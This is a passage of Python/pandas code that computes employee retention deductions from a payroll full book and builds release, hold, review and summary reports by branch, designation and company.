    review_date = pd.Timestamp(release_review_date or date.today()).normalize()
    required = list(CONSOLIDATED_PAYSHEET_COLUMNS)
    missing = [c for c in required if c not in paysheet_df.columns]
    if missing:
        raise ValueError(f"Paysheet is missing required column(s): {', '.join(missing)}")

    out = paysheet_df.copy()
    out["ERP"] = out["ERP"].apply(_retention_clean_text)
    if out["ERP"].eq("").any():
        raise ValueError("ERP cannot be blank in the Retention Full Book.")

    out["Uploaded First Hire Date"] = parse_retention_date_series(out["First Hire Date"])
    out["Wage Month"] = parse_wage_month_series(out["Wage Month"])
    out["Wage Month Valid"] = out["Wage Month"].notna()

    # Canonical FHD = earliest valid FHD for each ERP in the uploaded book.
    out["__erp_key"] = _retention_normalise_key_series(out["ERP"])
    valid_hire = out.dropna(subset=["Uploaded First Hire Date"])
    canonical_hire = valid_hire.groupby("__erp_key")["Uploaded First Hire Date"].min()
    distinct_hire = valid_hire.groupby("__erp_key")["Uploaded First Hire Date"].nunique()
    out["First Hire Date"] = out["__erp_key"].map(canonical_hire)
    out["First Hire Date Valid"] = out["First Hire Date"].notna()
    out["First Hire Date Variance"] = out["__erp_key"].map(distinct_hire.gt(1)).fillna(False).astype(bool)
    out["First Hire Date Recovered"] = out["Uploaded First Hire Date"].isna() & out["First Hire Date Valid"]

    valid_pair = out["Wage Month Valid"]
    duplicate_pair = out.loc[valid_pair].duplicated(subset=["__erp_key", "Wage Month"], keep=False)
    if duplicate_pair.any():
        bad = out.loc[valid_pair].loc[duplicate_pair, ["ERP", "Wage Month"]].head(10).copy()
        bad["Wage Month"] = bad["Wage Month"].dt.strftime("%b-%Y")
        examples = ", ".join(f"{r['ERP']} ({r['Wage Month']})" for _, r in bad.iterrows())
        raise ValueError(
            "The full book contains more than one row for the same ERP and Wage Month: " + examples
        )

    out["Monthly Gross"] = coerce_numeric_column(out["Monthly Gross"], "Monthly Gross")
    out["Net Pay"] = coerce_numeric_column(out["Net Pay"], "Net Pay")
    out["Financial Data Valid"] = (
        out["Monthly Gross"].notna() & out["Net Pay"].notna()
        & out["Monthly Gross"].ge(0) & out["Net Pay"].ge(0)
    )

    out = _attach_employee_profile(out, "ERP", employee_master)

    exceptional_set = {
        _retention_clean_text(v).upper()
        for v in (exceptional_erps or []) if _retention_clean_text(v)
    }
    ignored_cc_set = {
        _retention_clean_text(v).upper()
        for v in (ignored_company_codes or []) if _retention_clean_text(v)
    }
    out["Exceptional ERP"] = out["ERP"].str.upper().isin(exceptional_set)
    out["Company Code Excluded"] = (
        out["Company Code"].fillna("").astype(str).str.strip().str.upper().isin(ignored_cc_set)
    )
    out = _attach_customize_rule(out, customize_dashboard)
    out["Eligibility Reason"] = out.apply(_retention_exclusion_reason, axis=1)
    out["Retention Eligible"] = out["Eligibility Reason"].eq("Eligible")

    out["Employment Month Index"] = _retention_month_difference(out["Wage Month"], out["First Hire Date"])
    out["Employment Month Number"] = (out["Employment Month Index"] + 1).where(
        out["Employment Month Index"].notna() & out["Employment Month Index"].ge(0)
    ).astype("Int64")
    out["Within Initial 3 Months"] = out["Employment Month Index"].between(0, 2, inclusive="both").fillna(False)
    out["Deduction Stage"] = out["Employment Month Index"].apply(_deduction_stage_from_index)

    out["10% of Gross"] = out["Monthly Gross"] * 0.10
    out["Deduction Applicable"] = (
        out["Retention Eligible"]
        & out["First Hire Date Valid"]
        & out["Wage Month Valid"]
        & out["Within Initial 3 Months"]
        & out["Financial Data Valid"]
    )
    out["Deduction Amount"] = 0.0
    applicable = out["Deduction Applicable"]
    if applicable.any():
        out.loc[applicable, "Deduction Amount"] = out.loc[
            applicable, ["10% of Gross", "Net Pay"]
        ].min(axis=1).clip(lower=0)

    out["Expected Release Date"] = out["First Hire Date"] + pd.to_timedelta(release_days, unit="D")
    out["Release Days Policy"] = release_days
    out["Release Review Date"] = review_date

    valid_wage_months = out.loc[out["Wage Month Valid"], "Wage Month"]
    current_payroll_month = valid_wage_months.max() if not valid_wage_months.empty else pd.NaT
    out["Current Payroll Month"] = current_payroll_month
    out["Current Payroll Row"] = out["Wage Month"].eq(current_payroll_month) if pd.notna(current_payroll_month) else False
    first_hire_month = out["First Hire Date"].dt.to_period("M").dt.to_timestamp()
    out["New Joiner in Current Payroll"] = (
        out["Current Payroll Row"] & first_hire_month.eq(current_payroll_month)
    )

    def _row_status(row):
        if not row["First Hire Date Valid"]:
            return "Invalid First Hire Date"
        if not row["Wage Month Valid"]:
            return "Invalid Wage Month"
        if row["Employment Month Index"] < 0:
            return "Before First Hire Month"
        if row["Company Code Excluded"]:
            return "Excluded Company Code - No Deduction"
        if row["Exceptional ERP"]:
            return "Exceptional ERP - No Deduction"
        if row["Employee Master Mapping Missing"]:
            return "Employee Master Mapping Missing"
        if not row["Customize Rule Matched"]:
            return "Customize Rule Missing"
        if normalise_retention_employment_type(row.get("Employment Type")) != "Full Time":
            return "Non-Full Time - No Deduction"
        if str(row.get("Retention Applicable", "")).strip().lower() != "yes":
            return "Retention Not Applicable - No Deduction"
        if row["Employment Month Index"] > 2:
            return "Initial 3 Deductions Completed / No Further Deduction"
        if not row["Financial Data Valid"]:
            return "Invalid Pay Data"
        if row["Deduction Amount"] <= 0:
            return f"{row['Deduction Stage']} - Zero Eligible Amount" if row["Deduction Stage"] else "No Deduction"
        return row["Deduction Stage"]

    out["Status"] = out.apply(_row_status, axis=1)
    out["Final Retention Remark"] = out["Status"]
    out["Deduction Occurred"] = out["Deduction Amount"].gt(0)

    out = out.sort_values(["__erp_key", "Wage Month"], na_position="last").reset_index(drop=True)
    out["Cumulative Deduction Count"] = out.groupby("__erp_key")["Deduction Occurred"].cumsum().astype(int)
    out["Cumulative Retention Held"] = out.groupby("__erp_key")["Deduction Amount"].cumsum()
    out["First Hire Month"] = out["First Hire Date"].dt.to_period("M").astype("string")

    # Make the monthly retention sequence explicit in the ledger.  The stage is
    # determined from First Hire Date vs Wage Month, while the count is the
    # number of positive deductions actually reconstructed from the uploaded
    # full book up to that Wage Month.
    out["Deduction Count After Wage Month"] = out["Cumulative Deduction Count"]

    # Once an employee is past employment month 3, do not imply that all three
    # deductions were completed unless the reconstructed count really is 3/3.
    # This is important for old joiners whose uploaded full book contains only
    # one or two of the expected initial-month deductions.
    initial_window_passed = (
        out["Retention Eligible"]
        & out["Employment Month Index"].gt(2)
        & out["First Hire Date Valid"]
        & out["Wage Month Valid"]
    )
    completed_three = initial_window_passed & out["Cumulative Deduction Count"].ge(3)
    incomplete_three = initial_window_passed & out["Cumulative Deduction Count"].lt(3)
    out.loc[completed_three, "Status"] = "3/3 Deductions Completed - No Further Deduction"
    out.loc[incomplete_three, "Status"] = out.loc[incomplete_three, "Cumulative Deduction Count"].apply(
        lambda count: f"Initial 3-Month Window Passed - {int(count)}/3 Deductions Found"
    )
    out["Final Retention Remark"] = out["Status"]

    out["Deduction Sequence Remark"] = out.apply(
        lambda row: (
            f"{row['Deduction Stage']} | Deduction count {int(row['Cumulative Deduction Count'])}/3"
            if bool(row.get("Deduction Occurred", False)) and row.get("Deduction Stage")
            else str(row.get("Status", ""))
        ),
        axis=1,
    )

    # Compatibility alias for older report/UI code.
    out["Paysheet Month"] = out["Wage Month"]

    summary_rows = []
    for erp_key, group in out.groupby("__erp_key", sort=True):
        group = group.sort_values("Wage Month", na_position="last")
        latest = group.iloc[-1]
        current_rows = group.loc[group["Current Payroll Row"]]
        current = current_rows.iloc[-1] if not current_rows.empty else None
        deduction_rows = group.loc[group["Deduction Occurred"]].copy()
        deduction_count = int(len(deduction_rows))
        total_held = float(deduction_rows["Deduction Amount"].sum())
        expected_release = group["Expected Release Date"].dropna().min() if group["Expected Release Date"].notna().any() else pd.NaT
        first_hire_date = group["First Hire Date"].dropna().min() if group["First Hire Date"].notna().any() else pd.NaT

        # Base eligibility is employee/rule based, independent of which wage month row is latest.
        eligible_rows = group.loc[group["Retention Eligible"]]
        base_eligible = not eligible_rows.empty
        eligibility_reason = "Eligible" if base_eligible else str(latest.get("Eligibility Reason", "Not Eligible"))

        if pd.isna(expected_release):
            days_until_release = None
        else:
            days_until_release = int((pd.Timestamp(expected_release).normalize() - review_date).days)

        release_date_reached = bool(
            pd.notna(expected_release)
            and review_date >= pd.Timestamp(expected_release).normalize()
        )

        # Release / Hold logic:
        #   Release Due -> exactly 3 reconstructed deductions + release date reached.
        #   Hold        -> 1/3, 2/3 or 3/3 deductions and release date is still pending.
        #   Review      -> release date reached but fewer than 3 deductions were found.
        # This keeps "Hold Cases" aligned to the business definition supplied by
        # payroll while still surfacing incomplete historical deductions safely.
        if not base_eligible:
            release_status = "Not Applicable"
            release_remark = f"No release tracking - {eligibility_reason}"
        elif deduction_count == 3 and release_date_reached:
            release_status = "Release Due"
            release_remark = (
                "3/3 deductions completed and First Hire Date + release days has been reached."
            )
        elif deduction_count in (1, 2, 3) and not release_date_reached:
            release_status = f"Hold - {deduction_count}/3 Deductions; Release Date Pending"
            release_remark = (
                f"{deduction_count}/3 deductions completed; hold until "
                f"{format_date_ddmmmyyyy(expected_release)}."
            )
        elif deduction_count < 3 and release_date_reached:
            release_status = f"Review Required - {deduction_count}/3 Deductions"
            release_remark = (
                f"Release date has been reached, but only {deduction_count}/3 deductions "
                "were reconstructed from the uploaded Retention Full Book."
            )
        else:
            release_status = "No Deduction Yet"
            release_remark = (
                "Eligible employee, but no positive retention deduction has been reconstructed yet."
            )

        stage_amounts = {}
        stage_months = {}
        for stage in ["First Month Deduction", "Second Month Deduction", "Final Month Deduction"]:
            stage_rows = group.loc[group["Deduction Stage"].eq(stage)]
            stage_amounts[stage] = float(stage_rows["Deduction Amount"].sum()) if not stage_rows.empty else 0.0
            valid_stage_months = stage_rows["Wage Month"].dropna()
            stage_months[stage] = valid_stage_months.min() if not valid_stage_months.empty else pd.NaT

        first_deduction_month = deduction_rows["Wage Month"].min() if not deduction_rows.empty else pd.NaT
        final_deduction_month = deduction_rows["Wage Month"].max() if not deduction_rows.empty else pd.NaT

        current_deduction_count = (
            int(current.get("Cumulative Deduction Count", 0))
            if current is not None else deduction_count
        )
        if current is None:
            current_payroll_action = "No Current Payroll Row"
        elif bool(current.get("Deduction Occurred", False)):
            current_payroll_action = (
                f"Deduct - {current.get('Deduction Stage', 'Retention Deduction')} "
                f"({current_deduction_count}/3)"
            )
        elif deduction_count >= 3 and current.get("Employment Month Index") is not None:
            current_payroll_action = "No Deduction - 3/3 Deductions Already Completed"
        else:
            current_payroll_action = str(current.get("Status", "No Deduction"))

        summary_rows.append({
            "ERP": latest["ERP"],
            "First Hire Date": first_hire_date,
            "First Hire Date Variance": bool(group["First Hire Date Variance"].max()),
            "First Hire Date Recovered": bool(group["First Hire Date Recovered"].max()),
            "Branch": latest.get("Branch", ""),
            "Designation": latest.get("Designation", ""),
            "Company Code": latest.get("Company Code", ""),
            "Employment Type": latest.get("Employment Type", ""),
            "Retention Applicable": latest.get("Retention Applicable", ""),
            "Retention Eligibility": eligibility_reason,
            "Company Code Excluded": bool(group["Company Code Excluded"].max()),
            "Exceptional ERP": bool(group["Exceptional ERP"].max()),
            "Current Payroll Month": current_payroll_month,
            "Current Payroll Row Available": current is not None,
            "New Joiner in Current Payroll": bool(group["New Joiner in Current Payroll"].max()),
            "Current Payroll Deduction Stage": (
                current.get("Deduction Stage", "")
                if current is not None and float(current.get("Deduction Amount", 0.0)) > 0
                else (current.get("Status", "") if current is not None else "No Current Payroll Row")
            ),
            "Current Payroll Action": current_payroll_action,
            "Current Payroll Deduction Amount": float(current.get("Deduction Amount", 0.0)) if current is not None else 0.0,
            "Current Payroll Deduction Count": current_deduction_count,
            "Deduction Count": deduction_count,
            "Deduction Progress": f"{min(deduction_count, 3)}/3",
            "3 Deductions Completed": deduction_count == 3,
            "First Month Deduction Amount": stage_amounts["First Month Deduction"],
            "Second Month Deduction Amount": stage_amounts["Second Month Deduction"],
            "Final Month Deduction Amount": stage_amounts["Final Month Deduction"],
            "First Month Wage Month": stage_months["First Month Deduction"],
            "Second Month Wage Month": stage_months["Second Month Deduction"],
            "Final Month Wage Month": stage_months["Final Month Deduction"],
            "First Deduction Month": first_deduction_month,
            "Final Deduction Month": final_deduction_month,
            "Months Processed": int(group["Wage Month"].nunique()),
            "Months With Deduction": deduction_count,
            "Total Retention Held": total_held,
            "Total Deduction Accumulated": total_held,
            "Expected Release Date": expected_release,
            "Release Days Policy": release_days,
            "Release Review Date": review_date,
            "Release Date Reached": release_date_reached,
            "Days Until Release": days_until_release,
            "Release Amount": total_held if release_status == "Release Due" else 0.0,
            "Hold Amount": total_held if release_status.startswith("Hold") else 0.0,
            "Review Amount": total_held if release_status.startswith("Review Required") else 0.0,
            "Release Status": release_status,
            "Release / Hold Remark": release_remark,
            "Latest Status": latest.get("Status", ""),
        })

    summary = pd.DataFrame(summary_rows)
    if not summary.empty:
        summary = summary.sort_values(["Release Status", "ERP"]).reset_index(drop=True)
    out = out.drop(columns=["__erp_key"])
    return summary, out


# --------------------------------------------------------------------------
# Compatibility wrappers for the prior monthly-file implementation
# --------------------------------------------------------------------------

def compute_paysheet_deduction(
    df: pd.DataFrame,
    erp_col: str,
    first_hire_col: str,
    net_pay_col: str,
    gross_col: str,
    paysheet_month,
    exceptional_erps: list = None,
    customize_dashboard: pd.DataFrame = None,
    deduction_pct: float = 10.0,
    employee_master: pd.DataFrame = None,
    ignored_company_codes: list = None,
) -> pd.DataFrame:
    """Backward-compatible one-month wrapper around the full-book engine."""
    required = [erp_col, first_hire_col, net_pay_col, gross_col]
    missing = [c for c in required if c not in df.columns]
    if missing:
        raise ValueError(f"Paysheet is missing required column(s): {', '.join(missing)}")
    work = df.copy()
    work = work.rename(columns={
        erp_col: "ERP",
        first_hire_col: "First Hire Date",
        net_pay_col: "Net Pay",
        gross_col: "Monthly Gross",
    })
    work["Wage Month"] = pd.Timestamp(paysheet_month).to_period("M").to_timestamp()
    _, detail = process_retention_paysheet(
        work[CONSOLIDATED_PAYSHEET_COLUMNS],
        exceptional_erps=exceptional_erps,
        customize_dashboard=customize_dashboard,
        employee_master=employee_master,
        ignored_company_codes=ignored_company_codes,
        release_days=340,
        release_review_date=date.today(),
        deduction_pct=deduction_pct,
    )
    return detail


def process_consolidated_paysheets(
    monthly_inputs: list,
    exceptional_erps: list = None,
    customize_dashboard: pd.DataFrame = None,
    employee_master: pd.DataFrame = None,
    deduction_pct: float = 10.0,
    ignored_company_codes: list = None,
    release_days: int = 340,
    release_review_date=None,
) -> tuple:
    """Backward-compatible wrapper that stacks old monthly inputs into one full book."""
    rows = []
    for item in monthly_inputs or []:
        if isinstance(item, dict):
            month = item.get("month")
            data = item.get("data")
            source = item.get("source", "")
        else:
            month = item[0]
            data = item[1]
            source = item[2] if len(item) > 2 else ""
        if data is None or data.empty:
            continue
        work = data.copy()
        # Accept the old 4-column standardized shape.
        old_required = ["ERP", "First Hire Date", "Net Pay", "Monthly Gross"]
        missing = [c for c in old_required if c not in work.columns]
        if missing:
            raise ValueError(f"{source or 'Paysheet'} is missing required column(s): {', '.join(missing)}")
        work["Wage Month"] = pd.Timestamp(month).to_period("M").to_timestamp()
        rows.append(work[CONSOLIDATED_PAYSHEET_COLUMNS])
    if not rows:
        return pd.DataFrame(), pd.DataFrame()
    full_book = pd.concat(rows, ignore_index=True)
    return process_retention_paysheet(
        full_book,
        exceptional_erps=exceptional_erps,
        customize_dashboard=customize_dashboard,
        employee_master=employee_master,
        ignored_company_codes=ignored_company_codes,
        release_days=release_days,
        release_review_date=release_review_date,
        deduction_pct=deduction_pct,
    )


def consolidate_paysheet_months(monthly_results: list, erp_col: str = "ERP") -> tuple:
    """Compatibility aggregator for callers that already computed monthly results."""
    if not monthly_results:
        return pd.DataFrame(), pd.DataFrame()
    combined = pd.concat(monthly_results, ignore_index=True)
    if "Wage Month" not in combined.columns and "Paysheet Month" in combined.columns:
        combined["Wage Month"] = combined["Paysheet Month"]
    # If these are full-engine detail rows, rebuild a compact summary without
    # altering the already-computed deduction values.
    if "Deduction Amount" not in combined.columns:
        return pd.DataFrame(), combined
    combined["Wage Month"] = pd.to_datetime(combined["Wage Month"], errors="coerce")
    summary = combined.groupby(erp_col, dropna=False).agg(
        **{
            "First Hire Date": ("First Hire Date", "min"),
            "Branch": ("Branch", "last"),
            "Designation": ("Designation", "last"),
            "Company Code": ("Company Code", "last"),
            "Employment Type": ("Employment Type", "last"),
            "Retention Applicable": ("Retention Applicable", "last"),
            "Months Processed": ("Wage Month", "nunique"),
            "Months With Deduction": ("Deduction Amount", lambda s: int((s > 0).sum())),
            "Total Deduction Accumulated": ("Deduction Amount", "sum"),
            "Latest Status": ("Status", "last"),
        }
    ).reset_index()
    summary["Deduction Count"] = summary["Months With Deduction"]
    return summary, combined


def _retention_group_report(detail: pd.DataFrame, group_col: str) -> pd.DataFrame:
    if detail is None or detail.empty or group_col not in detail.columns:
        return pd.DataFrame()
    work = detail.copy()
    work[group_col] = work[group_col].fillna("").astype(str).str.strip().replace("", "Unmapped")
    return (
        work.groupby(group_col, dropna=False)
        .agg(
            Employees=("ERP", "nunique"),
            Paysheet_Rows=("ERP", "size"),
            Deduction_Rows=("Deduction Amount", lambda s: int((s > 0).sum())),
            Total_Retention_Fund=("Deduction Amount", "sum"),
        )
        .reset_index()
        .sort_values("Total_Retention_Fund", ascending=False)
        .reset_index(drop=True)
    )


def build_retention_reports(summary: pd.DataFrame, combined: pd.DataFrame) -> dict:
    """Build release, hold, deduction-history and audit reports from the full book."""
    report_names = [
        "ERP Summary", "Full Book Detail", "Month Wise Detail", "Current Payroll",
        "New Joiners - Current Payroll", "Eligible New Joiners - Current Payroll",
        "Deduction History", "Release Cases", "Hold Cases", "Review Cases", "No Deduction Yet",
        "Not Applicable", "Monthly Summary", "Branch Summary", "Designation Summary",
        "Company Summary", "Employment Type Summary", "Status Summary", "Exclusion Summary",
        "Pending Releases", "Exceptions - No Deduction", "Missing Mapping", "First Hire Date Audit",
    ]
    if combined is None or combined.empty:
        return {name: pd.DataFrame() for name in report_names}

    work = combined.copy()
    work["Wage Month"] = pd.to_datetime(work["Wage Month"], errors="coerce")

    monthly = (
        work.groupby("Wage Month", dropna=False)
        .agg(
            Employees=("ERP", "nunique"),
            Deduction_Employees=("Deduction Amount", lambda s: int((s > 0).sum())),
            First_Month_Deductions=("Status", lambda s: int(s.eq("First Month Deduction").sum())),
            Second_Month_Deductions=("Status", lambda s: int(s.eq("Second Month Deduction").sum())),
            Final_Month_Deductions=("Status", lambda s: int(s.eq("Final Month Deduction").sum())),
            Total_Retention_Fund=("Deduction Amount", "sum"),
        )
        .reset_index()
        .sort_values("Wage Month", na_position="last")
    )

    status_summary = (
        work.groupby("Status", dropna=False)
        .agg(Rows=("ERP", "size"), Employees=("ERP", "nunique"), Total_Retention_Fund=("Deduction Amount", "sum"))
        .reset_index()
        .sort_values(["Rows", "Status"], ascending=[False, True])
    )

    exclusion_statuses = [
        "Excluded Company Code - No Deduction",
        "Exceptional ERP - No Deduction",
        "Non-Full Time - No Deduction",
        "Retention Not Applicable - No Deduction",
        "Employee Master Mapping Missing",
        "Customize Rule Missing",
    ]
    exclusion_summary = (
        work.loc[work["Status"].isin(exclusion_statuses)]
        .groupby("Status", dropna=False)
        .agg(Rows=("ERP", "size"), Employees=("ERP", "nunique"))
        .reset_index()
    )

    release_cases = summary.loc[summary["Release Status"].eq("Release Due")].copy() if summary is not None and not summary.empty else pd.DataFrame()
    hold_cases = summary.loc[summary["Release Status"].astype(str).str.startswith("Hold")].copy() if summary is not None and not summary.empty else pd.DataFrame()
    review_cases = summary.loc[summary["Release Status"].astype(str).str.startswith("Review Required")].copy() if summary is not None and not summary.empty else pd.DataFrame()
    no_deduction_yet = summary.loc[summary["Release Status"].eq("No Deduction Yet")].copy() if summary is not None and not summary.empty else pd.DataFrame()
    not_applicable = summary.loc[summary["Release Status"].eq("Not Applicable")].copy() if summary is not None and not summary.empty else pd.DataFrame()
    current_payroll = work.loc[work["Current Payroll Row"]].copy()
    new_joiners = work.loc[work["New Joiner in Current Payroll"]].copy()
    eligible_new_joiners = new_joiners.loc[new_joiners["Retention Eligible"]].copy() if not new_joiners.empty else pd.DataFrame()
    deduction_history = work.loc[work["Deduction Occurred"]].copy()
    missing_mapping = work.loc[work["Status"].isin(["Employee Master Mapping Missing", "Customize Rule Missing"])].copy()
    first_hire_audit = work.loc[
        work["First Hire Date Variance"].fillna(False)
        | work["First Hire Date Recovered"].fillna(False)
        | work["Status"].eq("Invalid First Hire Date")
        | work["Status"].eq("Invalid Wage Month")
    ].copy()
    exceptions = work.loc[work["Status"].isin(exclusion_statuses)].copy()

    return {
        "ERP Summary": summary.copy() if isinstance(summary, pd.DataFrame) else pd.DataFrame(),
        "Full Book Detail": work,
        "Month Wise Detail": work,  # compatibility alias
        "Current Payroll": current_payroll,
        "New Joiners - Current Payroll": new_joiners,
        "Eligible New Joiners - Current Payroll": eligible_new_joiners,
        "Deduction History": deduction_history,
        "Release Cases": release_cases,
        "Hold Cases": hold_cases,
        "Review Cases": review_cases,
        "No Deduction Yet": no_deduction_yet,
        "Not Applicable": not_applicable,
        "Monthly Summary": monthly,
        "Branch Summary": _retention_group_report(work, "Branch"),
        "Designation Summary": _retention_group_report(work, "Designation"),
        "Company Summary": _retention_group_report(work, "Company Code"),
        "Employment Type Summary": _retention_group_report(work, "Employment Type"),
        "Status Summary": status_summary,
        "Exclusion Summary": exclusion_summary,
        "Pending Releases": hold_cases,  # compatibility alias
        "Exceptions - No Deduction": exceptions,
        "Missing Mapping": missing_mapping,
        "First Hire Date Audit": first_hire_audit,
    }
